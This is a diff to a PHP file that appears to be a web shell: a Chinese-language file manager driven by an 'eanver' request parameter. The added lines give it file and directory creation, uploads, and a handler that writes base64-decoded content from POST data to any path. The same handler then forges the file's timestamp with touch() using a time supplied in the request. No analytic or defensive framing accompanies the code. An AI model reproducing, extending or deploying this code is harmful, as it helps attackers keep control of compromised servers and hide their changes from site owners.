@@ -108,3 +108,15 @@ switch($eanver){
 	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
 	$ROOT_DIR = File_Mode();
 	html_n("<table width=\"100%\" border=0 bgcolor=\"#555555\"><tr><td><form method='GET'>地址:<input type='hidden' name='eanver' value='main'>");
+html_n("<br><form method='POST' enctype=\"multipart/form-data\" action='?eanver=editr&p=".urlencode($path)."'>");
+	html_n("<input type=\"button\" value=\"新建文件\" onclick=\"rusurechk('newfile.php','?eanver=editr&p=".urlencode($path)."&refile=1&name=');\"> <input type=\"button\" value=\"新建目录\" onclick=\"rusurechk('newdir','?eanver=editr&p=".urlencode($path)."&redir=1&name=');\">");
+	html_input("file","upfilet","","&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ");
+	html_input("submit","uploadt","上传");
+	if(!empty($_POST['newfile'])){
+		if(isset($_POST['bin'])) $bin = $_POST['bin']; else $bin = "wb";
+        $newfile=base64_decode($_POST['newfile']);
+		if(strtolower($_POST['charset'])=='utf-8'){$txt=base64_decode($_POST['txt']);}else{$txt=$_POST['txt'];}
+        if (substr(PHP_VERSION,0,1)>=5){if((strtolower($_POST['charset'])=='gb2312') or (strtolower($_POST['charset'])=='gbk')){$txt=iconv("UTF-8","gb2312//IGNORE" ,base64_decode($_POST['txt']));}else{$txt = array_iconv($txt);}}
+		echo do_write($newfile,$bin,$txt) ? '<br>'.$newfile.' '.$msg[0] : '<br>'.$newfile.' '.$msg[1];
+		@touch($newfile,@strtotime($_POST['time']));
+	}
